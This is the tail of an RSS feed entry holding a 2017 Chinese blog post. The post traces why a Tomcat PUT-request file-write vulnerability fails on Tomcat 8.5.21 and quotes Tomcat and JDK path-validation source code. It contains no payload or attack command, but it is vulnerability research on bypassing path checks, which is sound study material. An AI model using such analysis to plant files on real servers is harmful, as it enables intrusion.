       main()&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-6734b1aa82d23171b2a2314fbbec15d3_r.jpg&quot; data-rawwidth=&quot;813&quot; data-rawheight=&quot;209&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;0x04 Tomcat 8.5.21!?&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;Tomcat 8.5.21 通过 WebResourceRoot 来处理资源文件：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   protected transient WebResourceRoot resources = null;
   ...

   @Override
   protected void doPut(HttpServletRequest req, HttpServletResponse resp)
       throws ServletException, IOException {
       ...
       try {
           if (range != null) {
               File contentFile = executePartialPut(req, range, path);
               resourceInputStream = new FileInputStream(contentFile);
           } else {
               resourceInputStream = req.getInputStream();
           }

           if (resources.write(path, resourceInputStream, true)) { // 进入 write
               if (resource.exists()) {
                   resp.setStatus(HttpServletResponse.SC_NO_CONTENT);
               } else {
                   resp.setStatus(HttpServletResponse.SC_CREATED);
               }
           } else {&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;接着调用 DirResourceSet.write ：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   @Override
   public boolean write(String path, InputStream is, boolean overwrite) {
       path = validate(path);
       if (!overwrite &amp;amp;&amp;amp; preResourceExists(path)) {
           return false;
       }
       // main 为 DirResourceSet 的 instance
       boolean writeResult = main.write(path, is, overwrite);
       ...
   }&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;DirResourceSet.write 的源码为：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   @Override
   public boolean write(String path, InputStream is, boolean overwrite) {
       checkPath(path);
       if (is == null) {
           throw new NullPointerException(
                   sm.getString(&quot;dirResourceSet.writeNpe&quot;));
       }
       if (isReadOnly()) {
           return false;
       }
       File dest = null;
       String webAppMount = getWebAppMount();
       if (path.startsWith(webAppMount)) {
           // 进入 file 方法
           dest = file(path.substring(webAppMount.length()), false);&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;file 方法：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   protected final File file(String name, boolean mustExist) {
           ...
           String canPath = null;
           try {
               canPath = file.getCanonicalPath();
           } catch (IOException e) {
               // Ignore
           }
           ...
           if ((absoluteBase.length() &amp;lt; absPath.length())
               &amp;amp;&amp;amp; (canonicalBase.length() &amp;lt; canPath.length())) {
               ...
               if (!canPath.equals(absPath))
                   return null;
           }
       } else {
           return null;
       }
       return file;
   }&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;换汤不换药，为什么不能触发呢？经过单步，发现成功通过判断，但是在文件复制的时候出现了问题：  &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   try {
       if (overwrite) {
           Files.copy(is, dest.toPath(), StandardCopyOption.REPLACE_EXISTING); // 此处
       } else {
           Files.copy(is, dest.toPath());
       }
   } catch (IOException ioe) {
       return false;
   }&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;在 toPath 方法的时候出现了问题：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   public Path toPath() {
       Path result = filePath;
       if (result == null) {
           synchronized (this) {
               result = filePath;
               if (result == null) {
                   result = FileSystems.getDefault().getPath(path);
                   filePath = result;
               }
           }
       }
       return result;
   }&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-1b5c33c929fd404a8c2e5e278f48e6d0_r.jpg&quot; data-rawwidth=&quot;998&quot; data-rawheight=&quot;241&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;WindowsPathParser.normalize 判断是是不是非法的字符：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   private static String normalize(StringBuilder sb, String path, int off) {
       ...
       while (off &amp;lt; len) {
           char c = path.charAt(off);
           if (isSlash(c)) {
               if (lastC == &#39; &#39;)
                   throw new InvalidPathException(path,
                                                  &quot;Trailing char &amp;lt;&quot; + lastC + &quot;&amp;gt;&quot;,
                                                  off - 1);
           ...
           } else {
               if (isInvalidPathChar(c))
                   throw new InvalidPathException(path,
                                                  &quot;Illegal char &amp;lt;&quot; + c + &quot;&amp;gt;&quot;,
                                                  off);
               lastC = c;
               off++;
           }
       }
       if (start != off) {
           if (lastC == &#39; &#39;)
               throw new InvalidPathException(path,
                                              &quot;Trailing char &amp;lt;&quot; + lastC + &quot;&amp;gt;&quot;,
                                              off - 1);
           sb.append(path, start, off);
       }
       return sb.toString();
   }&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;以及：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   private static final boolean isInvalidPathChar(char var0) {
       return var0 &amp;lt; &#39; &#39; || &quot;&amp;lt;&amp;gt;:\&quot;|?*&quot;.indexOf(var0) != -1;
   }&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;难过。&lt;/p&gt;</description>
<author>perhaps</author>
<guid isPermaLink="false">2017-09-25-29649377</guid>
<pubDate>Mon, 25 Sep 2017 00:00:00 +0800</pubDate>
</item>
</channel>
</rss>
